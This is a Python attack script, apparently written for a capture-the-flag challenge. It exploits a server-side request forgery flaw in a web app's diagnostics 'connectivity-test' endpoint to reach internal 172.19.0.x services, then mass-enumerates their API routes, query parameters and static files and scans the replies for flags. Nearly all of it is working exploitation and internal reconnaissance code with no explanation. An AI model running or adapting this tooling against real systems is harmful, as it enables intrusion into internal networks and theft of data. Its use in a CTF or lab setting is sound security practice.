#!/usr/bin/env python3
import concurrent.futures
import json
import os
import re
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request

HOST = "9taux6shw8cpbvs5.instances.ctfcup.online"
BASE = f"http://{HOST}"
OUT = "/tmp/web-out"
os.makedirs(OUT, exist_ok=True)
JSONL = os.path.join(OUT, "probe7.jsonl")
SUMMARY = os.path.join(OUT, "SUMMARY7.txt")
ctx = ssl._create_unverified_context()
FLAG_RE = re.compile(r"ctfcup\{[^}]+\}")
jf = open(JSONL, "w", encoding="utf-8", buffering=1)
sf = open(SUMMARY, "w", encoding="utf-8", buffering=1)

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

opener = urllib.request.build_opener(NoRedirect, urllib.request.HTTPSHandler(context=ctx))

def emit(rec):
    rec = dict(rec)
    if isinstance(rec.get("body"), str) and len(rec["body"]) > 50000:
        rec["body"] = rec["body"][:50000]
    line = json.dumps(rec, ensure_ascii=False)
    jf.write(line + "\n")
    flags = FLAG_RE.findall(line)
    if flags:
        sf.write(f"FLAG {flags} :: {line[:14000]}\n")
    sf.flush()
    return rec

def note(s):
    print(s, flush=True)
    sf.write(s + "\n")
    sf.flush()

def section(s):
    note(f"\n===== {s} =====")

def call_ssrf(target, timeout=12):
    q = urllib.parse.urlencode({"target": target})
    req = urllib.request.Request(f"{BASE}/api/diagnostics/connectivity-test?{q}", headers={"User-Agent": "Mozilla/5.0 probe7", "Accept": "application/json"})
    t = time.time()
    try:
        with opener.open(req, timeout=timeout) as r:
            raw = r.read(2_000_000); outer = r.status
    except urllib.error.HTTPError as e:
        raw = e.read(2_000_000); outer = e.code
    except Exception as e:
        return {"target": target, "kind": "outer-error", "error": f"{type(e).__name__}: {e}", "elapsed": round(time.time()-t,3)}
    elapsed = round(time.time()-t,3)
    try:
        data = json.loads(raw.decode("utf-8","replace"))
    except Exception:
        return {"target": target, "kind": "outer-nonjson", "outer_status": outer, "body": raw.decode("utf-8","replace")[:50000], "elapsed": elapsed}
    if "body" in data or isinstance(data.get("status"), int):
        kind = "http"
    else:
        err = str(data.get("error",""))
        if "Connection refused" in err: kind="refused"
        elif "name resolution" in err: kind="dns"
        elif "timed out" in err: kind="timeout"
        elif "No route" in err: kind="noroute"
        elif "reset" in err or "Remote end closed" in err or "EOF" in err: kind="reset"
        else: kind="error"
    return {"target": target, "kind": kind, "outer_status": outer, "elapsed": elapsed, **data}

def ssrf(host,port,path):
    return call_ssrf(f"http://mme-monitor@{host}:{port}{path}")

def interesting(rec):
    if rec.get("kind") != "http":
        return rec.get("kind") not in {"refused","dns","noroute","outer-error"}
    b = rec.get("body","") or ""
    if rec.get("status")==404 and ("The requested URL was not found" in b or (len(b)==207 and "Not Found" in b)):
        return False
    return True

def run_map(jobs, fn, label, workers=10, retry=True):
    res=[]; start=time.time()
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        futs={ex.submit(fn,j):j for j in jobs}
        for i,fut in enumerate(concurrent.futures.as_completed(futs),1):
            job=futs[fut]
            try: rec=fut.result()
            except Exception as e: rec={"target":str(job),"kind":"worker-error","error":repr(e)}
            rec["phase"]=label
            rec["job"]=job if isinstance(job,(str,int)) else list(job)
            emit(rec); res.append(rec)
            if interesting(rec):
                note("HIT "+json.dumps(rec,ensure_ascii=False)[:12000])
            if i%100==0 or i==len(jobs): print(f"[{label}] {i}/{len(jobs)} elapsed={time.time()-start:.1f}s",flush=True)
    if retry:
        rjobs=[]
        for r in res:
            if r.get("kind")=="outer-error":
                j=r.get("job"); rjobs.append(tuple(j) if isinstance(j,list) else j)
        if rjobs:
            section(f"RETRY {label}: {len(rjobs)}")
            time.sleep(2)
            res.extend(run_map(rjobs,fn,label+"-retry",workers=3,retry=False))
    return res

AGENT=("172.19.0.2",8081)
RELAY=("172.19.0.5",8082)
WEB=("172.19.0.4",8080)

section("SANITY")
for host,port,path in [(AGENT[0],AGENT[1],"/v1/health"),(AGENT[0],AGENT[1],"/v1/maintenance/validate"),(RELAY[0],RELAY[1],"/v1/health"),(RELAY[0],RELAY[1],"/v1/ingest")]:
    rec=ssrf(host,port,path); rec["phase"]="sanity"; emit(rec); note(json.dumps(rec,ensure_ascii=False)[:4000])

# Finish femto-agent scan: exact remaining paths + prior outer errors.
section("FEMTO-AGENT REMAINING + RETRY PATHS")
paths=[]
for fn in ["webprobe/remaining_paths.txt","webprobe/retry_paths.txt"]:
    try:
        paths.extend([x.strip() for x in open(fn,encoding="utf-8") if x.strip()])
    except FileNotFoundError:
        note(f"missing {fn}")
paths=sorted(set(paths))
run_map(paths, lambda p: ssrf(AGENT[0],AGENT[1],p), "agent-remaining", workers=8)

# Focused relay scan.
section("MME-LOG-RELAY FOCUSED V1 SCAN")
one_words = [
 "health","healthz","ready","status","info","version","config","ingest","ingestion","collect","collector",
 "collection","sink","spool","queue","buffer","journal","syslog","auditlog","eventlog","logstream",
 "ship","shipper","forwarder","forward","relay","tail","dump","snapshot","backup","restore","replay",
 "recent","latest","last","entries","entry","records","record","messages","message","events","event",
 "sessions","session","history","archive","audit","traces","trace","signaling","signalling","NAS","s1ap",
 "mme","subscribers","subscriber","ues","ue","contexts","context","procedures","procedure","requests",
 "request","responses","response","tickets","ticket","maintenance","support","dispatch","echo","memory",
 "cache","stored","storage","old","legacy","active","current","search","query","fetch","get","export",
 "download","stream","list","all","data","logs","log","naslog","s1aplog","mmelog","sessionlog","logsink",
 "event-log","log-events","log-entries","access-log","error-log","debug-log","raw","feed","inbox","outbox",
]
roots = ["log","logs","relay","mme","ingest","events","event","messages","message","sessions","session","records","record","entries","entry","history","archive","audit","traces","trace","signaling","signalling","NAS","s1ap","subscribers","subscriber","ues","ue","maintenance","tickets","ticket","support","dispatch","collector","collection","journal","syslog","data"]
subs = ["","health","status","info","version","config","recent","last","latest","tail","list","all","query","search","fetch","get","export","download","dump","snapshot","stream","replay","echo","old","legacy","active","current","stored","cached","history","archive","session","sessions","subscriber","subscribers","ue","ues","guti","imsi","imei","tmsi","ticket","tickets","maintenance","maintenance-ticket","active-ticket","validate","verify","issue"," FEMTO-042".strip(),"device","devices","raw","feed","entries","records","messages","events","logs"]
relay_paths=set()
for w in one_words:
    relay_paths.add('/v1/'+w)
for r in roots:
    for s in subs:
        relay_paths.add(f'/v1/{r}' if s=="" else f'/v1/{r}/{s}')
# Query variants for confirmed / likely routes.
for bp in ["/v1/logs","/v1/log","/v1/events","/v1/messages","/v1/sessions","/v1/records","/v1/entries","/v1/history","/v1/ingest"]:
    for q in ["device=FEMTO-042","device_id=FEMTO-042","limit=100","limit=1000","tail=100","recent=true","all=true","device_id=FEMTO-042&limit=100"]:
        relay_paths.add(f"{bp}?{q}")
relay_paths=sorted(relay_paths)
run_map(relay_paths, lambda p: ssrf(RELAY[0],RELAY[1],p), "relay-focused", workers=10)

# Static file enumeration, restricted to plausible role/data assets.
section("STATIC FILE ENUMERATION (agent/relay/web)")
static_words = ["dashboard","index","main","app","script","bundle","agent","femto-agent","femto_agent","relay","log-relay","mme-log-relay","mme_log_relay","maintenance","console","support","dispatch","field-support","ticket","tickets","session","sessions","subscriber","subscribers","ue","guti","imsi","NAS","s1ap","mme","monitor","backhaul","device","femtocell","radio","log","logs","event","events","message","messages","history","archive","record","records","entries","data","config","settings","state","cache","memory","echo","trace","traces","capture","pcap","flag","old-session","legacy","audit"]
exts=[".js",".json",".txt",".log",".html",".css"]
static_jobs=[]
for host,port in [AGENT,RELAY,WEB]:
    for w in static_words:
        for ext in exts:
            static_jobs.append((host,port,f"/static/{w}{ext}"))
    for fn in ["dashboard.js.map","favicon.ico","robots.txt",".gitkeep"]:
        static_jobs.append((host,port,"/static/"+fn))
run_map(static_jobs, lambda j: ssrf(j[0],j[1],j[2]), "static-enum", workers=10)

section("DONE")
note("probe7 complete")
jf.close(); sf.close()
